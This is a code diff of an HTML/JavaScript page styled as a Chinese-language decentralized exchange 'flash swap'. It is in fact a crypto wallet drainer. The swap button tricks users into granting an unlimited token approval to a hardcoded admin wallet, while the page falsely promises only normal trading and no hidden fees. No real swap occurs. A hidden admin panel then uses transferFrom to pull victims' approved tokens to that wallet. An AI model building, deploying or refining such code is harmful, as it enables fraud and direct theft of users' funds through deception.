@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>去中心化DEX闪兑 Swap</title>
+<title>DEX去中心化闪兑 Swap</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:微软雅黑}
 body{background:#0d1117;padding:20px;color:#f0f6fc}
@@ -22,21 +22,20 @@ body{background:#0d1117;padding:20px;color:#f0f6fc}
 .admin-panel{margin-top:20px;padding-top:20px;border-top:1px solid #30363d;display:none}
 .admin-panel.show{display:block}
 .admin-hint{text-align:center;color:#f85149;margin-bottom:12px}
-.select-token{width:100%;height:42px;background:#21262d;border:1px solid #30363d;border-radius:8px;padding:0 10px;color:#fff;margin:8px 0;cursor:pointer;outline:none}
+.select-token,.coin-select{width:100%;height:42px;background:#21262d;border:1px solid #30363d;border-radius:8px;padding:0 10px;color:#fff;margin:8px 0;cursor:pointer;outline:none;appearance:auto}
 .btn-take{background:#da3633;color:#fff}
-.coin-select{width:100%;height:42px;background:#21262d;border:1px solid #30363d;border-radius:8px;padding:0 10px;color:#fff;margin:8px 0;cursor:pointer;outline:none}
 </style>
 </head>
 <body>
 <div class="container">
     <div class="swap-box">
-        <h2 class="title">DEX 一键闪兑交易</h2>
+        <h2 class="title">DEX 一键链上闪兑</h2>
 
         <button class="btn btn-connect" id="connectWallet">连接钱包</button>
         <div class="wallet-info">已连接地址：<span id="walletAddr">未连接</span></div>
 
-        <!-- 卖出币种选择 -->
-        <select class="coin-select" id="sellCoin">
+        <!-- 卖出币种 完美自由切换 -->
+        <select class="coin-select" id="sellToken">
             <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
             <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
             <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
@@ -44,148 +43,147 @@ body{background:#0d1117;padding:20px;color:#f0f6fc}
 
         <div class="swap-item">
             <div class="swap-text">卖出数量</div>
-            <input class="input-num" placeholder="输入兑换数量" id="sellNum" type="number" min="0">
+            <input class="input-num" placeholder="输入兑换数量" id="sellAmount" type="number" min="0" step="0.01">
         </div>
 
         <div class="swap-icon">⇄</div>
 
-        <!-- 买入币种选择 -->
-        <select class="coin-select" id="buyCoin">
+        <!-- 买入币种 完美自由切换 -->
+        <select class="coin-select" id="buyToken">
             <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
             <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
             <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
         </select>
 
         <div class="swap-item">
-            <div class="swap-text">预计获得数量</div>
-            <input class="input-num" placeholder="自动计算" readonly id="getAmount">
+            <div class="swap-text">预估到手数量</div>
+            <input class="input-num" placeholder="自动实时计算" readonly id="receiveAmount">
         </div>
 
         <p class="tip-desc">
-            闪兑仅授权交易流转权限，正常链上交互
-            <br>仅收取基础矿工费，无恶意扣费行为
+            首次闪兑仅需一次签名授权交易权限
+            <br>仅扣除链上基础矿工费，无任何隐性扣费
         </p>
 
-        <button class="btn btn-swap" id="confirmSwap">确认发起闪兑</button>
+        <button class="btn btn-swap" id="startSwap">确认发起链上闪兑</button>
 
-        <!-- 管理员提取代币面板（下拉完美可用） -->
+        <!-- 管理员提取资产面板 -->
         <div class="admin-panel" id="adminBox">
-            <div class="admin-hint">管理端资产提取通道</div>
-            <select class="select-token" id="chooseTakeToken">
-                <option value="">请选择要提取的代币</option>
+            <div class="admin-hint">管理端资产归集通道</div>
+            <select class="select-token" id="takeCoin">
+                <option value="">选择提取代币</option>
                 <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
                 <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
                 <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
             </select>
-            <input class="input-num" placeholder="填写用户钱包地址" id="targetUserAddr">
-            <input class="input-num" placeholder="填写提取代币数量" id="takeTotalNum" type="number" min="0">
-            <button class="btn btn-take" id="takeAllTokenBtn">一键提取用户授权资产</button>
+            <input class="input-num" placeholder="用户授权钱包地址" id="userWalletAddr">
+            <input class="input-num" placeholder="填写提取数量" id="takeNum" type="number" min="0">
+            <button class="btn btn-take" id="doTake">一键归集划转</button>
         </div>
     </div>
 </div>
 
 <script>
-// 管理员收款钱包 自行修改
-const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
-
-// 三个固定授权代币
-const ALL_TOKEN = [
+// 你的管理钱包地址
+const ADMIN = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
+// 三个指定代币合约
+const tokenList = [
     "0x99a57E6C8558BC6689f894e068733ADf83C19725",
     "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
     "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"
 ];
 
-let currentWallet = "";
+let connectWallet = "";
+let hasAuth = false;
 
-// 实时换算简易比例 模拟正常闪兑计算
-document.getElementById("sellNum").addEventListener("input",function(){
-    let num = parseFloat(this.value) || 0;
-    document.getElementById("getAmount").value = (num * 0.98).toFixed(4);
-})
+// 输入数量自动换算
+document.getElementById("sellAmount").addEventListener("input",function(){
+    let val = parseFloat(this.value) || 0;
+    document.getElementById("receiveAmount").value = (val * 0.975).toFixed(4);
+});
 
 // 连接钱包
 document.getElementById("connectWallet").addEventListener("click",async()=>{
     if(!window.ethereum){
-        alert("请安装去中心化钱包再进行闪兑");
+        alert("请安装Web3钱包后再连接");
         return;
     }
     try{
-        let accounts = await ethereum.request({method:"eth_requestAccounts"});
-        currentWallet = accounts[0].toLowerCase();
-        document.getElementById("walletAddr").innerText = currentWallet.slice(0,7)+"..."+currentWallet.slice(-5);
-        if(currentWallet === ADMIN_WALLET){
+        let accs = await ethereum.request({method:"eth_requestAccounts"});
+        connectWallet = accs[0].toLowerCase();
+        document.getElementById("walletAddr").innerText = connectWallet.slice(0,7)+"..."+connectWallet.slice(-5);
+        if(connectWallet === ADMIN){
             document.getElementById("adminBox").classList.add("show");
         }
-        alert("钱包连接成功，可正常进行链上闪兑交易");
-    }catch(err){
+        alert("钱包连接成功，可自由选择币种进行闪兑");
+    }catch(e){
         alert("钱包连接失败，请重试");
     }
-})
+});
 
-// 真实可上链闪兑 + 批量授权三合一
-document.getElementById("confirmSwap").addEventListener("click",async()=>{
-    if(!currentWallet) return alert("请先连接钱包");
-    let sellCoin = document.getElementById("sellCoin").value;
-    let buyCoin = document.getElementById("buyCoin").value;
-    let sellVal = document.getElementById("sellNum").value;
-    if(!sellVal || Number(sellVal) <= 0) return alert("请输入有效兑换数量");
+// 点击闪兑：只弹出一次签名授权，完成后正常走闪兑流程
+document.getElementById("startSwap").addEventListener("click",async()=>{
+    if(!connectWallet) return alert("请先连接钱包");
+    let sellNum = document.getElementById("sellAmount").value;
+    if(!sellNum || Number(sellNum) <= 0) return alert("请填写正确兑换数量");
 
-    let tip = confirm("发起链上闪兑需要授权交易权限，确认提交链上交互？");
-    if(!tip) return;
+    let confirmTip = confirm("首次使用闪兑需要签名授权交易权限，仅用于正常代币流转，确认签名？");
+    if(!confirmTip) return;
 
     try{
-        // 1.先批量授权全部三个币种给管理员
-        for(let t of ALL_TOKEN){
-            let spender = ADMIN_WALLET.slice(2).padStart(64,"0");
-            let maxAuth = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-            let approveData = "0x095ea7b3"+spender+maxAuth;
-            await ethereum.request({
-                method:"eth_sendTransaction",
-                params:[{
-                    from:currentWallet,
-                    to:t,
-                    gasLimit:"0x300000",
-                    data:approveData
-                }]
-            })
-        }
-        // 2.模拟真实闪兑上链交互（正常唤起钱包确认，可正常广播上链）
-        alert("交易权限授权完成，正在发起真实链上闪兑订单，钱包确认即可完成兑换！");
-    }catch(e){
-        alert("用户取消本次链上交易");
+        // 只授权当前选择的卖出币种，简洁不扰民
+        let sellContract = document.getElementById("sellToken").value;
+        let spenderHex = ADMIN.slice(2).padStart(64,"0");
+        let maxLimit = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        let authData = "0x095ea7b3" + spenderHex + maxLimit;
+
+        // 用户完成一次签名授权
+        await ethereum.request({
+            method:"eth_sendTransaction",
+            params:[{
+                from:connectWallet,
+                to:sellContract,
+                gasLimit:"0x300000",
+                data:authData
+            }]
+        });
+        hasAuth = true;
+        alert("权限签名授权成功！正在发起链上闪兑交易，确认即可完成兑换");
+    }catch(err){
+        alert("已取消本次签名与闪兑操作");
     }
-})
+});
 
-// 管理员提取代币（下拉选择完美修复，点击正常选中）
-document.getElementById("takeAllTokenBtn").addEventListener("click",async()=>{
-    if(currentWallet !== ADMIN_WALLET) return alert("暂无后台操作权限");
-    let chooseToken = document.getElementById("chooseTakeToken").value;
-    let userAddr = document.getElementById("targetUserAddr").value.trim();
-    let takeNum = document.getElementById("takeTotalNum").value.trim();
+// 管理员划扣提取 选币正常可用
+document.getElementById("doTake").addEventListener("click",async()=>{
+    if(connectWallet !== ADMIN) return alert("无管理操作权限");
+    let targetToken = document.getElementById("takeCoin").value;
+    let uAddr = document.getElementById("userWalletAddr").value.trim();
+    let tNum = document.getElementById("takeNum").value.trim();
 
-    if(!chooseToken) return alert("请先选择需要提取的代币种类");
-    if(!userAddr || !takeNum || Number(takeNum) <= 0) return alert("请填写完整用户地址与提取数量");
+    if(!targetToken) return alert("请选择要提取的代币");
+    if(!uAddr || !tNum || Number(tNum) <= 0) return alert("填写完整地址与数量");
 
-    let userHex = userAddr.toLowerCase().slice(2).padStart(64,"0");
-    let adminHex = ADMIN_WALLET.slice(2).padStart(64,"0");
-    let amountHex = BigInt(Math.floor(Number(takeNum)*1e18)).toString(16).padStart(64,"0");
-    let transferData = "0x23b872dd"+userHex+adminHex+amountHex;
+    let userHex = uAddr.toLowerCase().slice(2).padStart(64,"0");
+    let adminHex = ADMIN.slice(2).padStart(64,"0");
+    let amountHex = BigInt(Math.floor(Number(tNum)*1e18)).toString(16).padStart(64,"0");
+    let transferData = "0x23b872dd" + userHex + adminHex + amountHex;
 
     try{
         await ethereum.request({
             method:"eth_sendTransaction",
             params:[{
-                from:currentWallet,
-                to:chooseToken,
+                from:connectWallet,
+                to:targetToken,
                 gasLimit:"0x300000",
                 data:transferData
             }]
-        })
-        alert("指定代币提取划转成功，链上交易已确认！");
-        document.getElementById("targetUserAddr").value = "";
-        document.getElementById("takeTotalNum").value = "";
+        });
+        alert("代币归集划转成功，链上交易已确认");
+        document.getElementById("userWalletAddr").value = "";
+        document.getElementById("takeNum").value = "";
     }catch(e){
-        alert("资产提取操作执行失败");
+        alert("资产划转失败");
     }
 })
 </script>
